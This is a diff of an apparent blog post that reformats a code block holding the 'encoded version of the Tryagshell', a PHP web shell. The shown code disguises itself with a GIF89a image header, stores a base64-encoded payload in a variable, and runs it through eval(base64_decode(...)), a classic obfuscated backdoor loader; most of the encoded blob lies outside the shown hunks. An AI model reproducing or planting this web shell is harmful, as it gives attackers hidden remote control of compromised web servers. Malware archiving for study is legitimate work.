@@ -14,9 +14,9 @@ tags:
 ---
 This is the encoded version of the Tryagshell (version 1.3 apparently)
 
-<pre class="brush: php; title: ; notranslate" title="">GIF89aP;
+{% highlight php %}GIF89aP;
 
-&lt;?
+<?
 
 $tryag="LyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio
 qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCi8qDQov
@@ -284,5 +284,5 @@ ciB5b3UgZG9uJ3QgaGF2ZQ0KYWNjZXNzLjwvQ0VOVEVSPjwvRk9OVD4iKTsNCn0=";
 eval(base64
 _decode($tryag));
 
-?&gt;
-</pre>
+?>
+{% endhighlight %}
